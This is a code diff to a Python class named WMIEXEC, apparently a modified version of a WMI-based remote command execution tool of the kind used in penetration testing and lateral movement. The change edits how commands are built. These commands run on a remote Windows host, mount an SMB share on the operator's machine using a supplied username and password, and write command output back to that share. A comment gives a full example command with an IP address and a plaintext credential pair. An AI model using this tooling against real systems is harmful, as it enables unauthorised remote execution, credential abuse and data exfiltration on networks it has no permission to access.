@@ -158,14 +158,22 @@ class WMIEXEC:
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
 
 
-        commandData = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
+        #commandData = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
+        #                                                                 self.__share_name,
+        #                                                                 self.__output)
+        commandData = data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
                                                                          self.__share_name,
                                                                          self.__output)
         
         #adding creds gets past systems disallowing guest-auth
         # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
         command = self.__shell + '"net use * /d /y & '
-        command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
+        #command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
+        #                                                                                         self.__share_name, 
+        #                                                                                         self.__username, 
+        #                                                                                         self.__password, 
+        #                                                                                         commandData)
+        command += 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
                                                                                                  self.__share_name, 
                                                                                                  self.__username, 
                                                                                                  self.__password, 
